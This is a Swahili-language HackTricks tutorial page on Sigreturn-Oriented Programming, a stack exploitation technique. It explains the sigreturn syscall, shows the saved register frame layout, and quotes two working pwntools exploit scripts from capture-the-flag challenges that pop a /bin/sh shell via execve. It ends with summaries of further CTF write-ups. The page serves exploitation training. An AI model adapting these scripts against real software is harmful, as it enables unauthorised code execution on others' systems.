# SROP - Programu ya Sigreturn-Oriented

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Taarifa Msingi

**`Sigreturn`** ni **syscall** maalum ambayo kimsingi hutumiwa kusafisha baada ya kikundi cha ishara kumaliza utekelezaji wake. Ishara ni mapumziko yanayotumwa kwa programu na mfumo wa uendeshaji, mara nyingi kumaanisha kuwa hali isiyo ya kawaida imejitokeza. Wakati programu inapokea ishara, kwa muda inasitisha kazi yake ya sasa kushughulikia ishara na **mchakato wa ishara**, kazi maalum iliyoundwa kushughulikia ishara.

Baada ya mchakato wa ishara kukamilika, programu inahitaji **kuendelea na hali yake ya awali** kana kwamba hakuna kitu kimetokea. Hapa ndipo **`sigreturn`** inapoingia. Inasaidia programu **kurudi kutoka kwa mchakato wa ishara** na kurejesha hali ya programu kwa kusafisha fremu ya steki (sehemu ya kumbukumbu inayohifadhi wito wa kazi na pembejeo za ndani) ambayo ilitumiwa na mchakato wa ishara.

Sehemu inayovutia ni jinsi **`sigreturn`** inavyorejesha hali ya programu: inafanya hivyo kwa kuhifadhi **thamani zote za rejista za CPU kwenye steki.** Ishara haipobanwa tena, **`sigreturn` inapitisha thamani hizi kutoka kwenye steki**, ikirejesha kimsingi rejista za CPU kwa hali yake kabla ya ishara kushughulikiwa. Hii ni pamoja na rejista ya kidole cha steki (RSP), ambayo inaelekeza kwenye sehemu ya juu ya steki ya sasa.

{% hint style="danger" %}
Kuita syscall **`sigreturn`** kutoka kwa mnyororo wa ROP na **kuongeza thamani za rejista** tungependa iweze kuzipakia kwenye **steki** inawezekana kudhibiti thamani zote za rejista na hivyo **kuita** kwa mfano syscall `execve` na `/bin/sh`.
{% endhint %}

Tafadhali angalia jinsi hii itakuwa **aina ya Ret2syscall** ambayo inafanya iwe rahisi kudhibiti vigezo vya kuita Ret2syscalls nyingine:

{% content-ref url="../rop-syscall-execv/" %}
[rop-syscall-execv](../rop-syscall-execv/)
{% endcontent-ref %}

Ikiwa una hamu hii ni **muundo wa sigcontext** uliohifadhiwa kwenye steki kwa kupona baadaye thamani (mtaalam kutoka [**hapa**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Kwa maelezo bora angalia pia:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Mfano

Unaweza [**kupata mfano hapa**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) ambapo wito wa signeturn unajengwa kupitia ROP (kuweka thamani `0xf` kwa rxa), ingawa hii ni shambulizi la mwisho kutoka hapo:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Angalia pia [**exploit kutoka hapa**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) ambapo binary ilikuwa tayari inaita `sigreturn` na kwa hivyo haifai kujenga hiyo na **ROP**:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## Mifano Mingine & Marejeo

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* Programu ya ushirikiano wa kufunga ambayo inaruhusu **kuandika kwenye steki** na kisha kuita **syscall ya `sigreturn`**. Inawezekana kuandika kwenye steki [**ret2syscall**](../rop-syscall-execv/) kupitia muundo wa **sigreturn** na kusoma bendera ambayo iko ndani ya kumbukumbu ya programu ya ushirikiano.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* Programu ya ushirikiano wa kufunga ambayo inaruhusu **kuandika kwenye steki** na kisha kuita **syscall ya `sigreturn`**. Inawezekana kuandika kwenye steki [**ret2syscall**](../rop-syscall-execv/) kupitia muundo wa **sigreturn** (programu ya ushirikiano ina mfuatano wa herufi `/bin/sh`).
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* Biti 64, hakuna relro, hakuna canary, nx, hakuna pie. Uvujaji rahisi wa steka unaoabuse kazi ya `gets` bila vifaa vya kutekeleza [**ret2syscall**](../rop-syscall-execv/). Mnyororo wa ROP unaandika `/bin/sh` katika `.bss` kwa kuita tena gets, inatumia kazi ya **`alarm`** kuweka eax kuwa `0xf` ili kuita **SROP** na kutekeleza kifaa cha shell.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* Programu ya ushirikiano ya biti 64, hakuna relro, hakuna canary, nx, hakuna pie. Mchakato unaruhusu kuandika kwenye steki, kudhibiti vijenzi kadhaa, na kuita syscall na kisha kuita `exit`. Kifaa cha kuchaguliwa ni `sigreturn` ambacho kitaweka vijenzi na kuhamisha `eip` ili kuita maagizo ya awali ya syscall na kukimbia `memprotect` kuweka nafasi ya programu kuwa `rwx` na kuweka ESP katika nafasi ya programu. Kufuata mchakato, programu itaita kusoma kwenye ESP tena, lakini katika kesi hii ESP itakuwa inaelekeza kwa maagizo yanayofuata hivyo kupitisha kifaa cha shell itaandika kama maagizo yanayofuata na kuyatekeleza.
* [https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection)
* SROP hutumiwa kutoa ruhusa ya utekelezaji (memprotect) kwenye sehemu ambapo kifaa cha shell kilipowekwa.
